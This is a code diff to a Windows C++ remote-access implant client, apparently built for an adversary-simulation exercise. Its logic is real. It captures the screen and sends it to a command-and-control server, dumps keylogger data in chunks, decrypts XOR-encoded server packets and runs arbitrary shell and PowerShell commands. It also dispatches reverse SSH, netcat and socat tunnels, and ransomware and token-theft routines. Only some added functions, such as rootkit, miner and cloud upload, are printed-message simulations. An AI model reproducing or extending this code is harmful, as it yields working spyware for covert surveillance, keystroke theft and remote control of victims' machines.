+        logActivity("CLIENT_DEBUG", "SCREENSHOT_DIMENSIONS", "Full screen size: " + std::to_string(fullScreenX) + "x" + std::to_string(fullScreenY) + 
+                   ", Capture size: " + std::to_string(screenX) + "x" + std::to_string(screenY));
+        
+        // Try multiple methods for screenshot capture
+        HDC hScreen = NULL;
+        HDC hDC = NULL;
+        HBITMAP hBitmap = NULL;
+        HGDIOBJ old_obj = NULL;
+        BOOL captureSuccess = FALSE;
+        
+        // Method 1: Standard BitBlt approach
+        hScreen = GetDC(NULL);
+        if (hScreen) {
+            hDC = CreateCompatibleDC(hScreen);
+            if (hDC) {
+                hBitmap = CreateCompatibleBitmap(hScreen, screenX, screenY);
+                if (hBitmap) {
+                    old_obj = SelectObject(hDC, hBitmap);
+                    
+                    // Try BitBlt first
+                    BOOL copyResult = BitBlt(hDC, 0, 0, screenX, screenY, hScreen, 0, 0, SRCCOPY);
+                    if (copyResult) {
+                        captureSuccess = TRUE;
+                        logActivity("CLIENT_DEBUG", "SCREENSHOT_METHOD", "BitBlt method succeeded");
+                    } else {
+                        DWORD lastError = GetLastError();
+                        logActivity("CLIENT_DEBUG", "SCREENSHOT_BITBLT_FAILED", "BitBlt failed with error: " + std::to_string(lastError));
+                        
+                        // Cleanup for retry
+                        SelectObject(hDC, old_obj);
+                        DeleteObject(hBitmap);
+                        DeleteDC(hDC);
+                        ReleaseDC(NULL, hScreen);
+                        
+                        // Method 2: PrintWindow approach
+                        hScreen = GetDC(NULL);
+                        if (hScreen) {
+                            hDC = CreateCompatibleDC(hScreen);
+                            if (hDC) {
+                                hBitmap = CreateCompatibleBitmap(hScreen, screenX, screenY);
+                                if (hBitmap) {
+                                    old_obj = SelectObject(hDC, hBitmap);
+                                    
+                                    BOOL printResult = PrintWindow(GetDesktopWindow(), hDC, PW_RENDERFULLCONTENT);
+                                    if (printResult) {
+                                        captureSuccess = TRUE;
+                                        logActivity("CLIENT_DEBUG", "SCREENSHOT_METHOD", "PrintWindow method succeeded");
+                                    } else {
+                                        DWORD printError = GetLastError();
+                                        logActivity("CLIENT_DEBUG", "SCREENSHOT_PRINTWINDOW_FAILED", "PrintWindow failed with error: " + std::to_string(printError));
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        
+        if (!captureSuccess) {
+            logActivity("CLIENT_DEBUG", "SCREENSHOT_ALL_METHODS_FAILED", "All screenshot methods failed");
+            if (hScreen) ReleaseDC(NULL, hScreen);
+            if (hDC) DeleteDC(hDC);
+            if (hBitmap) DeleteObject(hBitmap);
+            sendResponse("SCREENSHOT:ERROR:Failed to capture screen with all methods");
             return;
         }
         
-        HDC hDC = CreateCompatibleDC(hScreen);
-        HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, screenX, screenY);
-        HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
-        logActivity("CLIENT_DEBUG", "SCREENSHOT_BITMAP", "Created bitmap and device contexts");
-        
-        // Copy screen
-        BOOL copyResult = BitBlt(hDC, 0, 0, screenX, screenY, hScreen, 0, 0, SRCCOPY);
-        logActivity("CLIENT_DEBUG", "SCREENSHOT_CAPTURE", "Screen copy result: " + std::string(copyResult ? "SUCCESS" : "FAILED"));
-        
-        if (!copyResult) {
-            logActivity("CLIENT_DEBUG", "SCREENSHOT_ERROR", "BitBlt failed with error: " + std::to_string(GetLastError()));
-            SelectObject(hDC, old_obj);
-            DeleteDC(hDC);
-            ReleaseDC(NULL, hScreen);
-            DeleteObject(hBitmap);
-            sendResponse("SCREENSHOT:ERROR:Failed to capture screen");
-            return;
-        }
+        logActivity("CLIENT_DEBUG", "SCREENSHOT_BITMAP", "Bitmap capture completed successfully");
         
         // Generate filename
         std::string filename = "C:\\Windows\\Temp\\screenshot_" + 
@@ -935,7 +1597,8 @@ public:
             std::string fullResponse = response.str();
             logActivity("CLIENT_DEBUG", "SCREENSHOT_RESPONSE_SIZE", "Total response size: " + std::to_string(fullResponse.length()) + " bytes");
             
-            sendResponse(fullResponse);
+            // Use sendData directly for large screenshots to enable chunking
+            sendData(fullResponse);
             logActivity("EXFIL", "SCREENSHOT_SENT", "Screenshot data sent to C2 server");
             
             // Clean up temporary file
@@ -1191,7 +1854,11 @@ public:
         }
         
         keylogData << "\nKEYLOG:DUMP:END";
-        sendResponse(keylogData.str());
+        
+        // Use sendData directly for large keylogs to enable chunking
+        std::string fullKeylogData = keylogData.str();
+        logActivity("CLIENT_DEBUG", "KEYLOG_RESPONSE_SIZE", "Total keylog response size: " + std::to_string(fullKeylogData.length()) + " bytes");
+        sendData(fullKeylogData);
     }
     
     void executeClipboard() {
@@ -1427,7 +2094,7 @@ public:
         }
     }
     
-    void executeTokenSteal() {
+    void executeOldTokenSteal() {
         sendResponse("TOKEN:STEALING");
         
         PrivilegeEscalation privEsc;
@@ -2094,7 +2761,7 @@ public:
     void executeRansomware() {
         sendResponse("RANSOMWARE:STARTING");
 
-        std::string baseDir = "C:\\temp\\ranom";
+        std::string baseDir = "C:\\temp\\random";
         CreateDirectoryA("C:\\temp", NULL);
         CreateDirectoryA(baseDir.c_str(), NULL);
 
@@ -2575,6 +3242,97 @@ public:
         sendResponse("RDP:COMPLETE");
     }
     
+    void executeProcessHollowing() {
+        sendResponse("PROCESS_HOLLOW:STARTING");
+        
+        // Simulate process hollowing technique
+        std::string hollowCmd = "powershell -Command \"" +
+                              std::string("Write-Host 'Process Hollowing Simulation'; ") +
+                              "$proc = Get-Process notepad -ErrorAction SilentlyContinue; " +
+                              "if ($proc) { Write-Host 'Target process found: notepad.exe'; } " +
+                              "else { Start-Process notepad; Start-Sleep 2; " +
+                              "$proc = Get-Process notepad; }; " +
+                              "Write-Host 'Process ID:' $proc.Id; " +
+                              "Write-Host 'Simulating memory injection...'; " +
+                              "Write-Host 'Process hollowing simulation complete'\"";
+        
+        executeShellCommand(hollowCmd);
+        sendResponse("PROCESS_HOLLOW:SIMULATED");
+        sendResponse("PROCESS_HOLLOW:COMPLETE");
+    }
+    
+    void executeTokenSteal() {
+        sendResponse("TOKEN_STEAL:STARTING");
+        
+        // Simulate token impersonation techniques
+        std::string tokenCmd = "powershell -Command \"" +
+                             std::string("Write-Host 'Token Theft Simulation'; ") +
+                             "whoami /all | Select-String 'SeDebugPrivilege'; " +
+                             "Get-Process | Where-Object {$_.ProcessName -eq 'winlogon'} | " +
+                             "ForEach-Object { Write-Host 'Target process for token theft: winlogon PID' $_.Id }; " +
+                             "Write-Host 'Simulating token duplication...'; " +
+                             "Write-Host 'Token theft simulation complete'\"";
+        
+        executeShellCommand(tokenCmd);
+        sendResponse("TOKEN_STEAL:SIMULATED");
+        sendResponse("TOKEN_STEAL:COMPLETE");
+    }
+    
+    void executeRootkitInstall() {
+        sendResponse("ROOTKIT:STARTING");
+        
+        // Simulate rootkit installation (safe simulation)
+        std::string rootkitCmd = "powershell -Command \"" +
+                               std::string("Write-Host 'Rootkit Installation Simulation'; ") +
+                               "Write-Host 'Checking system integrity...'; " +
+                               "sfc /verifyonly 2>&1 | Select-String 'integrity violations'; " +
+                               "Write-Host 'Simulating kernel driver installation...'; " +
+                               "Write-Host 'Creating persistence mechanism...'; " +
+                               "Write-Host 'Rootkit simulation complete - NO ACTUAL ROOTKIT INSTALLED'\"";
+        
+        executeShellCommand(rootkitCmd);
+        sendResponse("ROOTKIT:SIMULATED");
+        sendResponse("ROOTKIT:COMPLETE");
+    }
+    
+    void executeCryptoMiner() {
+        sendResponse("CRYPTO_MINER:STARTING");
+        
+        // Simulate cryptocurrency mining (CPU stress test)
+        std::string minerCmd = "powershell -Command \"" +
+                             std::string("Write-Host 'Cryptocurrency Miner Simulation'; ") +
+                             "Write-Host 'Simulating CPU-intensive mining operation...'; " +
+                             "$startTime = Get-Date; " +
+                             "while ((Get-Date) -lt $startTime.AddSeconds(5)) { " +
+                             "$hash = [System.Security.Cryptography.SHA256]::Create(); " +
+                             "$bytes = [System.Text.Encoding]::UTF8.GetBytes((Get-Random)); " +
+                             "$result = $hash.ComputeHash($bytes); " +
+                             "}; " +
+                             "Write-Host 'Mining simulation complete - NO ACTUAL MINING PERFORMED'\"";
+        
+        executeShellCommand(minerCmd);
+        sendResponse("CRYPTO_MINER:SIMULATED");
+        sendResponse("CRYPTO_MINER:COMPLETE");
+    }
+    
+    void executeCloudUpload() {
+        sendResponse("CLOUD_UPLOAD:STARTING");
+        
+        // Simulate cloud service data upload
+        std::string uploadCmd = "powershell -Command \"" +
+                              std::string("Write-Host 'Cloud Upload Simulation'; ") +
+                              "Write-Host 'Gathering sensitive files...'; " +
+                              "Get-ChildItem $env:USERPROFILE\\Documents -Recurse -Include *.txt,*.doc*,*.pdf | " +
+                              "Select-Object Name, Length | Format-Table; " +
+                              "Write-Host 'Simulating upload to cloud storage...'; " +
+                              "Write-Host 'Creating fake upload manifest...'; " +
+                              "Write-Host 'Cloud upload simulation complete - NO ACTUAL UPLOAD PERFORMED'\"";
+        
+        executeShellCommand(uploadCmd);
+        sendResponse("CLOUD_UPLOAD:SIMULATED"); 
+        sendResponse("CLOUD_UPLOAD:COMPLETE");
+    }
+    
     void executeMicrophoneRecord() {
         sendResponse("MICROPHONE:STARTING");
         
@@ -2710,6 +3468,23 @@ public:
     void processCommand(CommandType cmd, const std::string& params = "") {
         logActivity("CLIENT_DEBUG", "PROCESS_COMMAND", "Processing C2 command ID: " + std::to_string(cmd) + " with params: " + params);
         
+        // For most commands, add them to the job queue for multi-threaded execution
+        // Some commands (like heartbeat) are processed immediately
+        if (cmd == CMD_HEARTBEAT || cmd == CMD_BEACON) {
+            // Process immediately for time-sensitive commands
+            processCommandDirect(cmd, params);
+        } else {
+            // Add to job queue for threaded execution
+            std::string commandId = "CMD_" + std::to_string(cmd) + "_" + std::to_string(GetTickCount());
+            addJob(commandId, cmd, params, [this, cmd, params]() {
+                processCommandDirect(cmd, params);
+            });
+        }
+    }
+    
+    void processCommandDirect(CommandType cmd, const std::string& params = "") {
+        logActivity("CLIENT_DEBUG", "PROCESS_COMMAND_DIRECT", "Executing C2 command ID: " + std::to_string(cmd) + " with params: " + params);
+        
         switch (cmd) {
             case CMD_BEACON:
                 logActivity("CLIENT_DEBUG", "CMD_BEACON", "Sending beacon acknowledgment");
@@ -2747,7 +3522,7 @@ public:
                 break;
                 
             case CMD_PROCESS_HOLLOW:
-                executeProcessHollow();
+                executeProcessHollowing();
                 break;
                 
             case CMD_PORT_SCAN:
@@ -2873,6 +3648,18 @@ public:
                 executeSocatRelay();
                 break;
 
+            case CMD_ROOTKIT_INSTALL:
+                executeRootkitInstall();
+                break;
+                
+            case CMD_CRYPTO_MINER:
+                executeCryptoMiner();
+                break;
+                
+            case CMD_CLOUD_UPLOAD:
+                executeCloudUpload();
+                break;
+
             case CMD_RANSOMWARE:
                 executeRansomware();
                 break;
@@ -2891,18 +3678,36 @@ public:
         // Debug: Log command received
         logActivity("CLIENT_DEBUG", "COMMAND_RECEIVED", "Processing command - Size: " + std::to_string(size) + " bytes");
         
+        std::string cmdId;
+        
         // Try to parse as C2Packet first
         if (size >= sizeof(C2Packet)) {
             logActivity("CLIENT_DEBUG", "PACKET_PARSE", "Attempting to parse as C2Packet (size >= " + std::to_string(sizeof(C2Packet)) + ")");
             
-            std::string decryptedPacket = xorEncrypt(std::string(buffer, sizeof(C2Packet)), "PaloAltoEscapeRoom");
-            C2Packet* packet = (C2Packet*)decryptedPacket.c_str();
+            // Decrypt the entire buffer first, then extract the packet
+            std::string decryptedBuffer = xorEncrypt(std::string(buffer, size), "PaloAltoEscapeRoom");
             
-            logActivity("CLIENT_DEBUG", "PACKET_SIGNATURE", "Packet signature: 0x" + std::to_string(packet->signature) + " (expected: 0xC2E5CA9E)");
-            
-            if (packet->signature == 0xC2E5CA9E) {
+            // Only check if we have enough decrypted data for a packet
+            if (decryptedBuffer.size() >= sizeof(C2Packet)) {
+                C2Packet* packet = (C2Packet*)decryptedBuffer.c_str();
+                
+                logActivity("CLIENT_DEBUG", "PACKET_SIGNATURE", "Packet signature: 0x" + std::to_string(packet->signature) + " (expected: 0xC2E5CA9E)");
+                
+                if (packet->signature == 0xC2E5CA9E) {
                 logActivity("CLIENT_DEBUG", "PACKET_VALID", "Valid C2 packet found - Command ID: " + std::to_string(packet->commandId));
-                processCommand((CommandType)packet->commandId);
+                
+                std::string commandType = "PACKET_CMD_" + std::to_string(packet->commandId);
+                cmdId = startCommandTracking(commandType, "Binary C2 Packet Command");
+                updateCommandStatus(cmdId, CMD_PROCESSING);
+                
+                try {
+                    processCommand((CommandType)packet->commandId);
+                    updateCommandStatus(cmdId, CMD_COMPLETED);
+                } catch (const std::exception& e) {
+                    updateCommandStatus(cmdId, CMD_FAILED, "", e.what());
+                } catch (...) {
+                    updateCommandStatus(cmdId, CMD_FAILED, "", "Unknown exception");
+                }
                 return;
             } else {
                 logActivity("CLIENT_DEBUG", "PACKET_INVALID", "Invalid packet signature, trying text command parsing");
@@ -2925,39 +3730,69 @@ public:
         std::string cleanPreview = decrypted.length() > 100 ? decrypted.substr(0, 100) + "..." : decrypted;
         logActivity("CLIENT_DEBUG", "TEXT_COMMAND_CLEANED", "Cleaned command: '" + cleanPreview + "'");
         
-        // Parse different command formats
-        if (decrypted.find("SHELL:EXEC:") == 0) {
-            logActivity("CLIENT_DEBUG", "COMMAND_TYPE", "Shell execution command detected");
-            std::string cmd = decrypted.substr(11);
-            executeShellCommand(cmd);
-        } else if (decrypted.find("SHELL:INIT:") == 0) {
-            sendResponse("SHELL:READY");
-        } else if (decrypted.find("POWERSHELL:EXEC:") == 0) {
-            std::string cmd = decrypted.substr(16);
-            executePowerShell(cmd);
-        } else if (decrypted.find("KEYLOG:") == 0) {
-            logActivity("CLIENT_DEBUG", "COMMAND_TYPE", "Keylogger command detected: " + decrypted);
-            if (decrypted == "KEYLOG:START:HOOK") {
-                logActivity("CLIENT_DEBUG", "KEYLOG_COMMAND", "Starting keylogger hook");
-                executeKeyloggerStart();
-            } else if (decrypted == "KEYLOG:DUMP") {
-                logActivity("CLIENT_DEBUG", "KEYLOG_COMMAND", "Dumping keylogger data");
-                executeKeyloggerDump();
-            } else {
-                logActivity("CLIENT_DEBUG", "KEYLOG_COMMAND", "Unrecognized keylog command: " + decrypted);
-            }
-        } else if (decrypted.find("TOR_API:EXECUTE:REAL") == 0) {
-            logActivity("CLIENT_DEBUG", "TOR_API_REAL", "Received command to make real TOR API calls");
-            executeTorApiCall();
-        } else if (decrypted.find("TOR:CONNECT:REAL") == 0) {
-            logActivity("CLIENT_DEBUG", "TOR_CONNECT_REAL", "Received command to make real TOR connections");
-            executeTorConnect();
-        } else if (decrypted.find("SSH:REVERSE:TUNNEL:") == 0) {
-            logActivity("CLIENT_DEBUG", "SSH_TUNNEL_CMD", "Received SSH reverse tunnel command");
-            executeReverseSSH();
-        } else if (decrypted.find("NETCAT:TUNNEL:CREATE:") == 0 || decrypted.find("PROCESS:CREATE:") == 0 && decrypted.find("nc.exe") != std::string::npos) {
-            logActivity("CLIENT_DEBUG", "NETCAT_CMD", "Received netcat command");
-            executeNetcatTunnel();
+        // Start command tracking for text commands
+        std::string commandType = "UNKNOWN";
+        if (decrypted.find("SHELL:") == 0) commandType = "SHELL";
+        else if (decrypted.find("POWERSHELL:") == 0) commandType = "POWERSHELL";
+        else if (decrypted.find("KEYLOG:") == 0) commandType = "KEYLOG";
+        else if (decrypted.find("SCREENSHOT:") == 0) commandType = "SCREENSHOT";
+        else if (decrypted.find("CAMPAIGN:") == 0) commandType = "CAMPAIGN";
+        else if (decrypted.find("TOR:") == 0) commandType = "TOR";
+        else if (decrypted.find("SSH:") == 0) commandType = "SSH";
+        else if (decrypted.find("NETCAT:") == 0) commandType = "NETCAT";
+        else if (decrypted.find("SOCAT:") == 0) commandType = "SOCAT";
+        else if (decrypted.find("TERMINATE") == 0) commandType = "TERMINATE";
+        
+        cmdId = startCommandTracking(commandType, cleanPreview);
+        updateCommandStatus(cmdId, CMD_PROCESSING);
+        
+        // Parse different command formats with proper error handling
+        try {
+            bool commandFound = false;
+            
+            if (decrypted.find("SHELL:EXEC:") == 0) {
+                logActivity("CLIENT_DEBUG", "COMMAND_TYPE", "Shell execution command detected");
+                std::string cmd = decrypted.substr(11);
+                executeShellCommand(cmd);
+                commandFound = true;
+            } else if (decrypted.find("SHELL:INIT:") == 0) {
+                sendResponse("SHELL:READY");
+                commandFound = true;
+            } else if (decrypted.find("POWERSHELL:EXEC:") == 0) {
+                std::string cmd = decrypted.substr(16);
+                executePowerShell(cmd);
+                commandFound = true;
+            } else if (decrypted.find("KEYLOG:") == 0) {
+                logActivity("CLIENT_DEBUG", "COMMAND_TYPE", "Keylogger command detected: " + decrypted);
+                if (decrypted == "KEYLOG:START:HOOK") {
+                    logActivity("CLIENT_DEBUG", "KEYLOG_COMMAND", "Starting keylogger hook");
+                    executeKeyloggerStart();
+                    commandFound = true;
+                } else if (decrypted == "KEYLOG:DUMP") {
+                    logActivity("CLIENT_DEBUG", "KEYLOG_COMMAND", "Dumping keylogger data");
+                    executeKeyloggerDump();
+                    commandFound = true;
+                } else {
+                    logActivity("CLIENT_DEBUG", "KEYLOG_COMMAND", "Unrecognized keylog command: " + decrypted);
+                    updateCommandStatus(cmdId, CMD_FAILED, "", "Unrecognized keylog command");
+                    return;
+                }
+            } else if (decrypted.find("TOR_API:EXECUTE:REAL") == 0) {
+                logActivity("CLIENT_DEBUG", "TOR_API_REAL", "Received command to make real TOR API calls");
+                executeTorApiCall();
+                commandFound = true;
+            } else if (decrypted.find("TOR:CONNECT:REAL") == 0) {
+                logActivity("CLIENT_DEBUG", "TOR_CONNECT_REAL", "Received command to make real TOR connections");
+                executeTorConnect();
+                commandFound = true;
+            } else if (decrypted.find("SSH:REVERSE:TUNNEL:") == 0) {
+                logActivity("CLIENT_DEBUG", "SSH_TUNNEL_CMD", "Received SSH reverse tunnel command");
+                executeReverseSSH();
+                commandFound = true;
+            } else if (decrypted.find("NETCAT:TUNNEL:CREATE:") == 0 || decrypted.find("PROCESS:CREATE:") == 0 && decrypted.find("nc.exe") != std::string::npos) {
+                logActivity("CLIENT_DEBUG", "NETCAT_CMD", "Received netcat command");
+                executeNetcatTunnel();
+                commandFound = true;
         } else if (decrypted.find("SOCAT:RELAY:CREATE:") == 0 || decrypted.find("DOWNLOAD:") == 0 && decrypted.find("socat") != std::string::npos) {
             logActivity("CLIENT_DEBUG", "SOCAT_CMD", "Received socat command");
             executeSocatRelay();
@@ -3005,8 +3840,21 @@ public:
             } else {
                 logActivity("CLIENT_DEBUG", "SCREEN_COMMAND", "Unrecognized screen command: " + decrypted);
             }
-        } else {
-            logActivity("CLIENT_DEBUG", "COMMAND_UNRECOGNIZED", "Unrecognized command: " + decrypted);
+            } else {
+                logActivity("CLIENT_DEBUG", "COMMAND_UNRECOGNIZED", "Unrecognized command: " + decrypted);
+                updateCommandStatus(cmdId, CMD_FAILED, "", "Unrecognized command");
+                return;
+            }
+            
+            // Mark command as completed if it was found and executed
+            if (commandFound) {
+                updateCommandStatus(cmdId, CMD_COMPLETED);
+            }
+            
+        } catch (const std::exception& e) {
+            updateCommandStatus(cmdId, CMD_FAILED, "", std::string("Exception: ") + e.what());
+        } catch (...) {
+            updateCommandStatus(cmdId, CMD_FAILED, "", "Unknown exception during command execution");
         }
     }
     
@@ -3016,6 +3864,14 @@ public:
         ioctlsocket(serverSocket, FIONBIO, &mode);
         
         auto lastBeacon = std::chrono::steady_clock::now();
+        auto lastStatusReport = std::chrono::steady_clock::now();
+        
+        // Data buffering for chunked data
+        std::string dataBuffer;
+        std::string chunkedDataBuffer;
+        bool receivingChunks = false;
+        int expectedChunks = 0;
+        int receivedChunks = 0;
         
         while (connected) {
             // Check for incoming commands
@@ -3024,7 +3880,66 @@ public:
             
             if (bytes > 0) {
                 logActivity("CLIENT_DEBUG", "COMMAND_RECEIVED_MAIN", "Received " + std::to_string(bytes) + " bytes from server - processing...");
-                processServerCommand(buffer, bytes);
+                
+                // Decrypt the received data
+                std::string receivedData = xorEncrypt(std::string(buffer, bytes), "PaloAltoEscapeRoom");
+                
+                // Check if this is chunked data
+                if (receivedData.find("CHUNK:") == 0) {
+                    if (!receivingChunks) {
+                        // Start receiving chunks
+                        receivingChunks = true;
+                        chunkedDataBuffer.clear();
+                        receivedChunks = 0;
+                        
+                        // Parse expected chunks from first chunk
+                        size_t pos = receivedData.find('\n');
+                        if (pos != std::string::npos) {
+                            std::string header = receivedData.substr(0, pos);
+                            size_t slashPos = header.find('/');
+                            if (slashPos != std::string::npos) {
+                                size_t colonPos = header.find(':', slashPos);
+                                if (colonPos != std::string::npos) {
+                                    expectedChunks = std::stoi(header.substr(slashPos + 1, colonPos - slashPos - 1));
+                                    logActivity("CLIENT_DEBUG", "CHUNK_START", "Starting to receive " + std::to_string(expectedChunks) + " chunks");
+                                }
+                            }
+                        }
+                    }
+                    
+                    // Extract chunk data (skip header and separator)
+                    size_t headerEnd = receivedData.find('\n');
+                    size_t separatorStart = receivedData.find("\n---CHUNK---\n");
+                    
+                    if (headerEnd != std::string::npos && separatorStart != std::string::npos) {
+                        std::string chunkData = receivedData.substr(headerEnd + 1, separatorStart - headerEnd - 1);
+                        chunkedDataBuffer += chunkData;
+                        receivedChunks++;
+                        
+                        logActivity("CLIENT_DEBUG", "CHUNK_RECEIVED", "Received chunk " + std::to_string(receivedChunks) + "/" + std::to_string(expectedChunks));
+                    }
+                } else if (receivedData.find("CHUNK:COMPLETE:") == 0) {
+                    // All chunks received, process complete data
+                    logActivity("CLIENT_DEBUG", "CHUNK_COMPLETE", "All chunks received, processing complete data (" + std::to_string(chunkedDataBuffer.length()) + " bytes)");
+                    processServerCommand(chunkedDataBuffer.c_str(), static_cast<int>(chunkedDataBuffer.length()));
+                    
+                    // Reset chunk state
+                    receivingChunks = false;
+                    chunkedDataBuffer.clear();
+                    expectedChunks = 0;
+                    receivedChunks = 0;
+                } else {
+                    // Regular data (not chunked)
+                    if (receivingChunks) {
+                        // We were expecting chunks but got regular data - this might be an error
+                        logActivity("CLIENT_DEBUG", "CHUNK_ERROR", "Expected chunked data but received regular data, resetting state");
+                        receivingChunks = false;
+                        chunkedDataBuffer.clear();
+                    }
+                    
+                    // Process regular command
+                    processServerCommand(buffer, bytes);
+                }
             } else if (bytes == 0) {
                 logActivity("CLIENT_DEBUG", "CONNECTION_CLOSED", "Server closed connection");
                 // Server disconnected
@@ -3034,6 +3949,7 @@ public:
                 int error = WSAGetLastError();
                 if (error != WSAEWOULDBLOCK) {
                     // Real error occurred
+                    logActivity("CLIENT_DEBUG", "RECV_ERROR", "Receive error: " + std::to_string(error));
                     connected = false;
                     break;
                 }
@@ -3044,6 +3960,12 @@ public:
             if (std::chrono::duration_cast<std::chrono::seconds>(now - lastBeacon).count() >= CLIENT_BEACON_INTERVAL) {
                 sendResponse("BEACON:KEEPALIVE:" + clientId);
                 lastBeacon = now;
+            }
+            
+            // Print command status every 30 seconds
+            if (std::chrono::duration_cast<std::chrono::seconds>(now - lastStatusReport).count() >= 30) {
+                printCommandStatus();
+                lastStatusReport = now;
             }
             
             Sleep(100);
